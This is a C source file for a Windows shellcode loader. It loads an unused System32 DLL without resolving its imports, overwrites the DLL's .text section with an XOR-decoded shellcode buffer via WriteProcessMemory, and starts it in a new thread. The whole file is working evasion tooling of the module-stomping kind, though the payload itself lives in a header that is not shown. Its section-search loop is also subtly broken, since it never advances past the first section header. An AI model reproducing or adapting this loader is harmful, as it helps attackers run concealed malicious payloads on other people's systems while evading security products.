#include "Shellcode.h"

//
// Includes
//
#include <windows.h>
#include <psapi.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winhttp.h>

//
// Debug Macros
//
#define DEBUG 1
#if DEBUG
#define PRINT_OK( x, ... )  printf( "[+] " x "\n", ##__VA_ARGS__ )
#define PRINT_ERR( x, ... ) printf( "[!] " x "\n", ##__VA_ARGS__ )
#define PRINT( x, ... )     printf( "[*] " x "\n", ##__VA_ARGS__ )
#define PRINT_DELIMITER()   printf( "----------------------------------------\n" )
#define NEWLINE()           printf( "\n" )
#else
#define PRINT_OK( x, ... )
#define PRINT_ERR( x, ... )
#define PRINT( x, ... )
#define PRINT_DELIMITER()
#define NEWLINE()
#endif

BOOL IsModuleLoaded(
    _In_ LPCSTR Module
) {
    HANDLE        Snapshot    = { 0 };
    MODULEENTRY32 ModuleEntry = { 0 };

    if ( ( Snapshot = CreateToolhelp32Snapshot( TH32CS_SNAPMODULE, GetCurrentProcessId() ) ) == INVALID_HANDLE_VALUE ) {
        PRINT_ERR( "CreateToolhelp32Snapshot failed" );
        return TRUE;
    }
    ModuleEntry.dwSize = sizeof( ModuleEntry );

    if ( ! Module32First( Snapshot, &ModuleEntry ) ) {
        PRINT_ERR( "Module32First failed" );
        return TRUE;
    }

    do {
        if ( strcmp( ModuleEntry.szModule, Module ) == 0 ) {
            PRINT_ERR( "%s is already loaded", Module );
            return TRUE;
        }
    } while ( Module32Next( Snapshot, &ModuleEntry ) );

    return FALSE;
}

LPVOID ModuleAlloc(
    _In_ const LPCSTR * ModuleName,
    _In_ SIZE_T         ModuleCount,
    _In_ DWORD          Size
) {
    LPVOID                Base         = { 0 };
    PIMAGE_DOS_HEADER     MmDosHdr     = { 0 };
    PIMAGE_NT_HEADERS     MmNtHdr      = { 0 };
    PIMAGE_SECTION_HEADER MmSectionHdr = { 0 };
    DWORD                 TxtSize      = { 0 };
    PVOID                 TxtAddr      = { 0 };

    for ( SIZE_T i = 0; i < ModuleCount; i++ ) {

        if ( IsModuleLoaded( ModuleName[i] ) ) {
            continue;
        }

        if ( ! ( Base = LoadLibraryExA( ModuleName[i], NULL, DONT_RESOLVE_DLL_REFERENCES ) ) ) {
            PRINT_ERR( "failed to load %s", ModuleName[i] );
            continue;
        }

        PRINT_OK( "%s => %p", ModuleName[i], Base );

        MmDosHdr = ( PIMAGE_DOS_HEADER )Base;
        MmNtHdr  = ( PIMAGE_NT_HEADERS )( ( UINT_PTR )Base + MmDosHdr->e_lfanew );
        PRINT_OK( "[%s] DOS: %p, NT: %p", ModuleName[i], MmDosHdr, MmNtHdr );

        MmSectionHdr = IMAGE_FIRST_SECTION( MmNtHdr );
        for ( DWORD i = 0; i < MmNtHdr->FileHeader.NumberOfSections; i++ ) {
            if ( strcmp( ( CHAR * )MmSectionHdr->Name, ".text" ) == 0 ) {
                break;
            }
        }

        TxtSize = MmSectionHdr->Misc.VirtualSize;
        if ( TxtSize < Size ) {
            /**
             * abort and move on to the next module
             */
            if ( Base ) {
                FreeLibrary( HMODULE( Base ) );
            }
            continue;
        }

        TxtAddr = ( PVOID )( ( UINT_PTR )Base + MmSectionHdr->VirtualAddress );
        break;
    }

    if ( ! TxtAddr ) {
        PRINT_ERR( "no suitable module found" );
        return NULL;
    }

    return TxtAddr;
}

BOOL FindModules(
    _Inout_ LPCSTR * Modules,
    _In_ SIZE_T      Max,
    _Out_ SIZE_T *   Count
) {
    *Count                = 0;
    const char *     Path = "C:\\Windows\\System32";
    WIN32_FIND_DATAA findData;
    HANDLE           hFind = INVALID_HANDLE_VALUE;
    char             searchPattern[MAX_PATH];
    snprintf( searchPattern, MAX_PATH, "%s\\*.dll", Path );
    hFind = FindFirstFileA( searchPattern, &findData );
    if ( hFind == INVALID_HANDLE_VALUE ) {
        return FALSE;
    }
    do {
        if ( *Count >= Max ) {
            break;
        }

        char dllPath[MAX_PATH];
        snprintf( dllPath, MAX_PATH, "%s\\%s", Path, findData.cFileName );

        //
        // if we can't get a handle to the module, it's probably not loaded
        //
        HMODULE hModule = GetModuleHandleA( findData.cFileName );
        if ( hModule == NULL ) {
            if ( strlen( findData.cFileName ) > 10 ) {
                continue;
            }
            Modules[*Count] = _strdup( findData.cFileName );
            if ( Modules[*Count] == NULL ) {
                FindClose( hFind );
                return FALSE;
            }
            ( *Count )++;
        }

    } while ( FindNextFileA( hFind, &findData ) != 0 );
    FindClose( hFind );
    return TRUE;
};

BOOL XOR(
    _In_ PUCHAR Data,
    _In_ SIZE_T DataSize,
    _In_ PUCHAR Key,
    _In_ SIZE_T KeySize
) {
    for ( SIZE_T i = 0; i < DataSize; i++ ) {
        BYTE temp = Key[i % KeySize];
        Data[i] ^= temp;
        temp ^= 0x41;
        temp ^= 0x41;

        Data[i] ^= ( temp ^ temp );
    }
    return TRUE;
}

INT main( int argc, char ** argv ) {
    CONST SIZE_T Max          = 100;
    SIZE_T       Count        = 0;
    LPCSTR       Modules[Max] = { 0 };
    if ( ! FindModules( Modules, Max, &Count ) ) {
        PRINT_ERR( "FindModules failed" );
        return 1;
    }

    LPVOID TxtAddr = ModuleAlloc( Modules, Max, SHELLCODE_SIZE );

    if ( ! TxtAddr ) {
        PRINT_ERR( "ModuleAlloc failed" );
        return 1;
    }

    BOOL   WriteSuccess = { 0 };
    HANDLE Thread       = { 0 };

    if ( ! XOR( Shellcode, SHELLCODE_SIZE, ( PUCHAR )&key, sizeof( key ) ) ) {
        PRINT_ERR( "XOR failed" );
        return 1;
    }

    if ( ! ( WriteSuccess = WriteProcessMemory( GetCurrentProcess(), TxtAddr, Shellcode, SHELLCODE_SIZE, NULL ) ) ) {
        PRINT_ERR( "WriteProcessMemory failed, %d", GetLastError() );
        return 1;
    }

    if ( ! ( Thread = CreateThread( NULL, 0, LPTHREAD_START_ROUTINE( TxtAddr ), NULL, 0, NULL ) ) ) {
        PRINT_ERR( "CreateThread failed, %d", GetLastError() );
        return 1;
    }

    WaitForSingleObject( Thread, INFINITE );
    return 0;
}